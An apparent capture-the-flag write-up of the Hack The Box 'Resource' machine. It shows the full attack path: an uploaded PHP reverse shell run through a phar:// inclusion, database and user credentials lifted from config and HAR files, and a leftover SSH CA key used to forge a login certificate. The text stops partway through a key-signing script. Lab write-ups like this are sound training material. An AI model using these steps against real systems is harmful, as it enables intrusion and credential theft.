+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -p22,80,2222 -vv -sC -sV --min-rate &lt;span style="color:#d3869b">5000&lt;/span> 10.10.11.27 -oA nmap/servce
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> itrc.ssg.htb &lt;span style="color:#fe8019">(&lt;/span>10.10.11.27&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received syn-ack &lt;span style="color:#fe8019">(&lt;/span>0.26s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2024-08-08 18:58:41 IST &lt;span style="color:#fe8019">for&lt;/span> 15s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh syn-ack OpenSSH 9.2p1 Debian 2+deb12u3 &lt;span style="color:#fe8019">(&lt;/span>protocol 2.0&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack nginx 1.18.0 &lt;span style="color:#fe8019">(&lt;/span>Ubuntu&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-cookie-flags:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| PHPSESSID:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ httponly flag not &lt;span style="color:#fabd2f">set&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: nginx/1.18.0 &lt;span style="color:#fe8019">(&lt;/span>Ubuntu&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: IT Support Center
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2222/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 &lt;span style="color:#fe8019">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;h3 id="port-80---http-nginx-1180">Port 80 - HTTP (Nginx &lt;code>1.18.0&lt;/code>)&lt;/h3>
+&lt;p>Forwarding to &lt;code>itrc.ssg.htb&lt;/code>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240808185634.webp">&lt;/figure>
+&lt;p>Adding that to &lt;code>/etc/hosts&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> -e &lt;span style="color:#b8bb26">&amp;#39;10.10.11.27\titrc.ssg.htb&amp;#39;&lt;/span> | sudo tee -a /etc/hosts
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240808190008.webp">&lt;/figure>
+&lt;p>Clicking on login redirects us to &lt;code>/?page=login&lt;/code>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240808190601.webp">&lt;/figure>
+&lt;p>I tried LFI on the &lt;code>page&lt;/code> parameter:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240808190744.webp">&lt;/figure>
+&lt;p>But it redirects us back to the home page. The &lt;code>#&lt;/code> at the end of the url was to bypass potential file extensions like &lt;code>.php&lt;/code> extension that will be added to the page value. I also tried &lt;code>%0a&lt;/code>, &lt;code>%00&lt;/code>, etc. Those were also not working&lt;/p>
+&lt;p>I registered an account and logged in and we can access a dashboard now.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240808191606.webp">&lt;/figure>
+&lt;p>We can create tickets and upload files. This is often the place for XSS, so we can enter some payloads for testing.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809183239.webp">&lt;/figure>
+&lt;p>I tried to use the upload functionality to upload a php reverse shell but that didn&amp;rsquo;t worked. It strictly checks if the upload file is a zip file.
+Next thing I noticed is every ticket have an &lt;code>id&lt;/code> assigned to it, and we can view the contents of the ticket.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809183352.webp">&lt;/figure>
+&lt;p>So I tried IDOR.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809183509.webp">&lt;/figure>
+&lt;p>That wasn&amp;rsquo;t working either, It redirected us to the home page.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809183525.webp">&lt;/figure>
+&lt;p>Then I checked the source code and saw that the value of the &lt;code>id&lt;/code> parameter was reflecting in the js code.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809183812.webp">&lt;/figure>
+&lt;p>We can inject js code through the &lt;code>id&lt;/code> paramter and when the &lt;code>submitComment&lt;/code> function is invoked, that is when we press the comment button our payload will execute.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809184230.webp">&lt;/figure>
+&lt;p>But it is just a self xss, no actual impact. Then again I focused on the upload functionality.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129192411.webp">&lt;/figure>
+&lt;p>The uploaded zip file is placed in the &lt;code>/uploads/&lt;/code>, the server renames the file. I checked if any of the files inside the zip file is extracted in the &lt;code>/uploads&lt;/code> folder but found nothing. If we can somehow execute a php file inside the zip archive we can achieve rce in the server. In php we can use the &lt;a href="https://www.php.net/manual/en/phar.using.stream.php">&lt;code>phar://&lt;/code> wrapper&lt;/a> to execute a php file inside the zip archive we upload. We can use the &lt;code>?page&lt;/code> parameter and give it a &lt;code>phar://&lt;/code> url and see how it responds.&lt;/p>
+&lt;hr>
+&lt;h2 id="exploitation">Exploitation&lt;/h2>
+&lt;h3 id="phar-deserialization">&lt;code>phar://&lt;/code> deserialization&lt;/h3>
+&lt;p>First lets create a zip file with a php reverse shell.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>cp /usr/share/webshells/php/php-reverse-shell.ph shell.php
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## change ip and port in shell.php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## then create the zip file&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zip -r poc.zip shell.php
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now upload the &lt;code>poc.zip&lt;/code> and execute the &lt;code>shell.php&lt;/code> by sending a request to:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>http://itrc.ssg.htb/?page=phar://uploads/83ffc3c94d5736acfff31d7092fed6d6dcf414cd.zip/shell
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And we got the shell&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809185821.webp">&lt;/figure>
+&lt;hr>
+&lt;h2 id="lateral-movement-to-user">Lateral Movement to user&lt;/h2>
+&lt;h3 id="local-enumeration">Local Enumeration&lt;/h3>
+&lt;p>There is a &lt;code>.dockerenv&lt;/code> file in the root directory, indicating that we are inside a docker container.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809191810.webp">&lt;/figure>
+&lt;p>I checked the &lt;code>/var/www/itrc&lt;/code> directory and saw a &lt;code>db.php&lt;/code> file&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">&amp;lt;?&lt;/span>php
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$dsn &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;mysql:host=db;dbname=resourcecenter;&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$dbusername &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;jj&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$dbpassword &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;ugEG5rR5SG8uPd&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$pdo &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#fe8019">new&lt;/span> PDO($dsn, $dbusername, $dbpassword);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $pdo&lt;span style="color:#fe8019">-&amp;gt;&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">setAttribute&lt;/span>(PDO&lt;span style="color:#fe8019">::&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">ATTR_ERRMODE&lt;/span>, PDO&lt;span style="color:#fe8019">::&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">ERRMODE_EXCEPTION&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#fe8019">catch&lt;/span> (PDOException $e) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">die&lt;/span>(&lt;span style="color:#b8bb26">&amp;#34;Connection failed: &amp;#34;&lt;/span> &lt;span style="color:#fe8019">.&lt;/span> $e&lt;span style="color:#fe8019">-&amp;gt;&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">getMessage&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>But we can&amp;rsquo;t connect to mysql.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809190108.webp">&lt;/figure>
+&lt;p>Maybe we can ssh directly into the host machine using the credential?&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129193523.webp">&lt;/figure>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129193539.webp">&lt;/figure>
+&lt;p>And that wasn&amp;rsquo;t working either.&lt;/p>
+&lt;p>Before moving on I checked the &lt;code>index.php&lt;/code> file to investigate why the &lt;code>phar://&lt;/code> attack worked and why the path traversal didn&amp;rsquo;t:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">&amp;lt;?&lt;/span>php session_start();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> (isset($_GET[&lt;span style="color:#b8bb26">&amp;#34;page&amp;#34;&lt;/span>]) &lt;span style="color:#fe8019">and&lt;/span> file_exists($_GET[&lt;span style="color:#b8bb26">&amp;#34;page&amp;#34;&lt;/span>] &lt;span style="color:#fe8019">.&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;.php&amp;#34;&lt;/span>)){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $page &lt;span style="color:#fe8019">=&lt;/span> $_GET[&lt;span style="color:#b8bb26">&amp;#34;page&amp;#34;&lt;/span>] &lt;span style="color:#fe8019">.&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;.php&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#fe8019">elseif&lt;/span> (isset($_SESSION[&lt;span style="color:#b8bb26">&amp;#34;username&amp;#34;&lt;/span>])) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $page &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;dashboard.php&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#fe8019">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $page &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;home.php&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">require_once&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;header.inc.php&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&amp;lt;div class=&lt;/span>&lt;span style="color:#b8bb26">\&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">main&lt;/span>&lt;span style="color:#b8bb26">\&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">&amp;gt;&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">include_once&lt;/span> $page;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&amp;lt;/div&amp;gt;&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">require_once&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;footer.inc.php&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">?&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It appends &lt;code>.php&lt;/code> to the value of &lt;code>page&lt;/code> parameter and checks if that file exists in the server using &lt;code>file_exists()&lt;/code> function. That&amp;rsquo;s why we were not able to read &lt;code>/etc/passwd&lt;/code> file before, because even if we add a &lt;code>#&lt;/code> at the end the &lt;code>file_exists(&amp;quot;../../../../etc/passwd#.php&amp;quot;)&lt;/code> check will fail. This is not that secure because we can perform path traversal and include &lt;code>php&lt;/code> files in other folders like &lt;code>../../test.php&lt;/code>. But including &lt;code>php&lt;/code> files already in the server doesn&amp;rsquo;t help us get a shell. Also the server strictly checks the uploaded file is a &lt;code>zip&lt;/code> file. So 0xdf, creator of the challenge chained this with a &lt;code>phar://&lt;/code> deserialization attack. cool&amp;hellip;
+After a lot of enumeration I couldn&amp;rsquo;t find anything useful. Then I checked the &lt;code>uploads/&lt;/code> directory and filtered all the &lt;code>zip&lt;/code> files to check if there&amp;rsquo;s anything interesting.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809191048.webp">&lt;/figure>
+&lt;p>It&amp;rsquo;s a &lt;a href="https://en.wikipedia.org/wiki/HAR_(file_format)">HAR&lt;/a> file:&lt;/p>
+&lt;div class="alert alert-note ">
+&lt;div class="alert-heading-box" >
+&lt;i class="bx bx-info-circle">&lt;/i>
+&lt;p class="alert-heading">
+What&amp;rsquo;s a HAR file?
+&lt;/p>
+&lt;/div>
+&lt;div class="alert-content" >
+&lt;p>The &lt;strong>HTTP Archive&lt;/strong> format, or &lt;strong>HAR&lt;/strong>, is a JSON-formatted archive file format for logging of a web browser&amp;rsquo;s interaction with a site. The common extension for these files is &lt;strong>.har&lt;/strong>.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;p>Since it logs all the interactions, we can check for leaked login credentials in this file, and we found one&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809191638.webp">&lt;/figure>
+&lt;p>It&amp;rsquo;s definitely a user in the machine&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809191735.webp">&lt;/figure>
+&lt;h3 id="lateral-movement---user-msainristil">Lateral Movement - user msainristil&lt;/h3>
+&lt;p>The container is running &lt;code>sshd&lt;/code> so we can try ssh into the user with the password&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809192052.webp">&lt;/figure>
+&lt;p>And it works&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809192137.webp">&lt;/figure>
+&lt;p>There is a &lt;code>decommission_old_ca&lt;/code> directory in the home&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809192355.webp">&lt;/figure>
+&lt;p>And it&amp;rsquo;s actually a &lt;a href="https://www.lorier.net/docs/ssh-ca.html">Certification Authority key&lt;/a>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809192513.webp">&lt;/figure>
+&lt;h3 id="lateral-movement---user-zzinter">Lateral Movement - user zzinter&lt;/h3>
+&lt;p>You can check the website I linked above or the &lt;code>CERTIFICATES&lt;/code> section in the man page of &lt;code>ssh-keygen&lt;/code> to learn more about this.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809195007.webp">&lt;/figure>
+&lt;p>So basically we can sign ssh keys for the users in the machine using this CA.
+Fi./rst we have to copy the private key &lt;code>ca-itrc&lt;/code> to our local machine. Then create an ssh key pair, and sign it using the CA key for the user &lt;code>zzinter&lt;/code> on the machine.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>chmod &lt;span style="color:#d3869b">600&lt;/span> ca-itrc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh-keygen -t rsa -f ctf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh-keygen -s ca-itrc -I &lt;span style="color:#b8bb26">&amp;#34;zzinter@itrc user key&amp;#34;&lt;/span> -n &lt;span style="color:#b8bb26">&amp;#34;zzinter&amp;#34;&lt;/span> ./ctf.pub
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;br>
+&lt;div class="alert alert-note collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-info-circle">&lt;/i>
+&lt;p class="alert-heading">
+Explantion
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>First we create a ssh key pair &lt;br>
+&lt;code>-t rsa&lt;/code> is to set the type of the key to &lt;code>rsa&lt;/code>&lt;br>
+&lt;code>-f&lt;/code> is to specify the name of the file&lt;br>
+Then we sign the public key using the CA certificate&lt;br>
+&lt;code>-s&lt;/code> specifies the CA certificate&lt;br>
+&lt;code>-I&lt;/code> it should be in the format &lt;code>user@hostname user key&lt;/code>&lt;br>
+&lt;code>-n&lt;/code> specifies the username&lt;br>&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;p>It will generate a &lt;code>ctf-cert.pub&lt;/code> file. Now we can copy all the generated files into the &lt;code>decommission_old_ca&lt;/code> directory. We can start a python http server in our machine and use wget to download all the files&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## our machine&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mkdir www
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mv ctf* www &lt;span style="color:#fe8019">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#fabd2f">cd&lt;/span> www
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>python3 -m http.server &lt;span style="color:#d3869b">8000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## htb machine&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wget http://10.10.10.1:8000/ -r -nd &lt;span style="color:#fe8019">&amp;amp;&amp;amp;&lt;/span> rm index.html
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we can login to &lt;code>zzinter&lt;/code> using the ssh private key:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh zzinter@10.10.11.27 -i ctf -o CertificateFile&lt;span style="color:#fe8019">=&lt;/span>ctf-cert.pub
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809200037.webp">&lt;/figure>
+&lt;hr>
+&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
+&lt;h3 id="local-enumeration-1">Local Enumeration&lt;/h3>
+&lt;p>There&amp;rsquo;s a &lt;code>sign_key_api.sh&lt;/code> file in the home&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809200324.webp">&lt;/figure>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#!/bin/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>usage &lt;span style="color:#fe8019">()&lt;/span> &lt;span style="color:#fe8019">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Usage: &lt;/span>$0&lt;span style="color:#b8bb26"> &amp;lt;public_key_file&amp;gt; &amp;lt;username&amp;gt; &amp;lt;principal&amp;gt;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">exit&lt;/span> &lt;span style="color:#d3869b">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$#&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -ne &lt;span style="color:#d3869b">3&lt;/span> &lt;span style="color:#fe8019">]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>public_key_file&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$1&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$2&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>principal_str&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$3&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>supported_principals&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;webserver,analytics,support,security&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>IFS&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;,&amp;#39;&lt;/span> &lt;span style="color:#fabd2f">read&lt;/span> -ra principal &lt;span style="color:#fe8019">&amp;lt;&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$principal_str&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">for&lt;/span> word in &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">${&lt;/span>principal[@]&lt;span style="color:#b8bb26">}&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>; &lt;span style="color:#fe8019">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> ! &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$supported_principals&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> | grep -qw &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$word&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
